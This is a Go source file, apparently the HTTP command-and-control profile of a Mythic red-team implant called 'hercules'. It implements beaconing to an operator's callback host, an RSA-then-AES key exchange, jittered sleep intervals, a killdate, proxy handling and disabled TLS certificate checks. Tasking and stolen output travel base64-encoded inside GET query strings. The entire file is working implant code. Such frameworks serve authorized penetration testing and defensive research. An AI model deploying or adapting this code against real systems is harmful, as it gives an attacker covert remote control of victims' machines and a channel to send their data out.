//go:build hercules_c2
// +build hercules_c2

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"log"
	"os"

	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/hercules/Payload_Type/hercules/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/hercules/Payload_Type/hercules/agent_code/pkg/utils/structs"
)

// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
// All variables must be a string so they can be set with ldflags

// callback_host is the callback host
var callback_host string

// callback_port is the callback port
var callback_port string

// killdate is the Killdate
var killdate string

// encrypted_exchange_check is Perform Key Exchange
var encrypted_exchange_check string

// callback_interval is the callback interval in seconds
var callback_interval string

// callback_jitter is Callback Jitter in percent
var callback_jitter string

// headers
var headers string

// AESPSK is the Crypto type
var AESPSK string

// post_uri is the POST request URI
var get_uri string
var query_path_name string

var proxy_host string
var proxy_port string
var proxy_user string
var proxy_pass string
var proxy_bypass string

type C2Default struct {
	BaseURL        string
	GetURI         string
	QueryPathName  string
	ProxyURL       string
	ProxyUser      string
	ProxyPass      string
	ProxyBypass    bool
	Interval       int
	Jitter         int
	HeaderList     []structs.HeaderStruct
	ExchangingKeys bool
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
	Killdate       time.Time
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func New() structs.Profile {
	var final_url string
	var last_slash int
	if callback_port == "443" && strings.Contains(callback_host, "https://") {
		final_url = callback_host
	} else if callback_port == "80" && strings.Contains(callback_host, "http://") {
		final_url = callback_host
	} else {
		last_slash = strings.Index(callback_host[8:], "/")
		if last_slash == -1 {
			//there is no 3rd slash
			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
		} else {
			//there is a 3rd slash, so we need to splice in the port
			last_slash += 8 // adjust this back to include our offset initially
			//fmt.Printf("index of last slash: %d\n", last_slash)
			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
		}
	}
	if final_url[len(final_url)-1:] != "/" {
		final_url = final_url + "/"
	}
	//fmt.Printf("final url: %s\n", final_url)
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2Default{
		BaseURL:       final_url,
		GetURI:        get_uri,
		QueryPathName: query_path_name,
		ProxyUser:     proxy_user,
		ProxyPass:     proxy_pass,
		Key:           AESPSK,
		Killdate:      killDateTime,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	// Add HTTP Headers
	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
	json.Unmarshal([]byte(headers), &profile.HeaderList)

	// Add proxy info if set
	if len(proxy_host) > 3 {
		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)

		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
			profile.ProxyUser = proxy_user
			profile.ProxyPass = proxy_pass
		}
	}

	// Convert ignore_proxy from string to bool
	profile.ProxyBypass, _ = strconv.ParseBool(proxy_bypass)

	if encrypted_exchange_check == "T" {
		profile.ExchangingKeys = true
	}
	UseCustomC2FormatBool, _ = strconv.ParseBool(UseCustomC2Format)
	return &profile
}

func (c *C2Default) Start() {
	// Checkin with Mythic via an egress channel
	resp := c.CheckIn()
	checkIn := resp.(structs.CheckInMessageResponse)
	// If we successfully checkin, get our new ID and start looping
	if strings.Contains(checkIn.Status, "success") {
		SetMythicID(checkIn.ID)
		for {
			// loop through all task responses
			message := CreateMythicMessage()
			encResponse, _ := json.Marshal(message)
			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
			resp := c.SendMessage(encResponse).([]byte)
			if len(resp) > 0 {
				//fmt.Printf("Raw resp: \n %s\n", string(resp))
				taskResp := structs.MythicMessageResponse{}
				err := json.Unmarshal(resp, &taskResp)
				if err != nil {
					log.Printf("Error unmarshal response to task response: %s", err.Error())
					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
					continue
				}
				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
			}
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
		}
	} else {
		fmt.Printf("Uh oh, failed to checkin\n")
	}
}

func (c *C2Default) GetSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2Default) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2Default) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2Default) ProfileType() string {
	return "http"
}

// CheckIn a new agent
func (c *C2Default) CheckIn() interface{} {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
		}
	}
	for {
		checkin := CreateCheckinMessage()
		raw, err := json.Marshal(checkin)
		if err != nil {
			continue
		}
		resp := c.SendMessage(raw).([]byte)

		// save the Mythic id
		response := structs.CheckInMessageResponse{}
		err = json.Unmarshal(resp, &response)

		if err != nil {
			//log.Printf("Error in unmarshal:\n %s", err.Error())
			continue
		}

		if len(response.ID) != 0 {
			//log.Printf("Saving new UUID: %s\n", response.ID)
			SetMythicID(response.ID)
		} else {
			continue
		}
		return response
	}

}

// NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() bool {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(raw)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw).([]byte)
	// Decrypt & Unmarshal the response

	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		log.Printf("Error unmarshaling eke response: %s\n", err.Error())
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}

// PostResponse - Post task responses
func (c *C2Default) SendMessage(output []byte) interface{} {
	endpoint := c.GetURI
	return c.htmlPostData(endpoint, output)

}

// htmlPostData HTTP GET function
func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
	targeturl := fmt.Sprintf("%s%s", c.BaseURL, urlEnding)
	if UseCustomC2FormatBool {
		sendData = MakeCustomC2Format(sendData)
	}
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	sendDataString := base64.URLEncoding.EncodeToString(sendData) // Base64 encode and convert to raw bytes
	targeturl = fmt.Sprintf("%s?%s=%s", targeturl, c.QueryPathName, sendDataString)
	//fmt.Printf(targeturl)
	for true {
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
		req, err := http.NewRequest("GET", targeturl, nil)
		if err != nil {
			fmt.Printf("Error creating new http request: %s", err.Error())
			continue
		}
		for _, val := range c.HeaderList {
			if val.Key == "Host" {
				req.Host = val.Value
			} else {
				req.Header.Set(val.Key, val.Value)
			}

		}
		// loop here until we can get our data to go through properly
		//fmt.Printf("about to post data\n")
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}

		if len(c.ProxyURL) > 0 {
			proxyURL, _ := url.Parse(c.ProxyURL)
			tr.Proxy = http.ProxyURL(proxyURL)
		} else if !c.ProxyBypass {
			// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
			tr.Proxy = http.ProxyFromEnvironment
		}

		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
			basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
			req.Header.Add("Proxy-Authorization", basicAuth)
		}

		client := &http.Client{
			Timeout:   30 * time.Second,
			Transport: tr,
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("error client.Do: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if resp.StatusCode != 200 {
			fmt.Printf("error resp.StatusCode: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			fmt.Printf("error ioutil.ReadAll: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			fmt.Printf("error base64.StdEncoding: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		if len(raw) < 36 {
			fmt.Printf("error len(raw) < 36: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the UUID
		// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw = c.decryptMessage(enc_raw)
			//log.Println(enc_raw)
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				fmt.Printf("error decrypt length wrong: %v\n", err)
				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
				continue
			}
		}
		//log.Printf("Raw htmlpost response: %s\n", string(enc_raw))
		if UseCustomC2FormatBool {
			enc_raw = UnMakeCustomC2Format(enc_raw)
			//log.Printf("fixed htmlpost response: %s\n", string(enc_raw))
		}
		return enc_raw
	}
	return make([]byte, 0) //shouldn't get here
}

func (c *C2Default) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Default) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
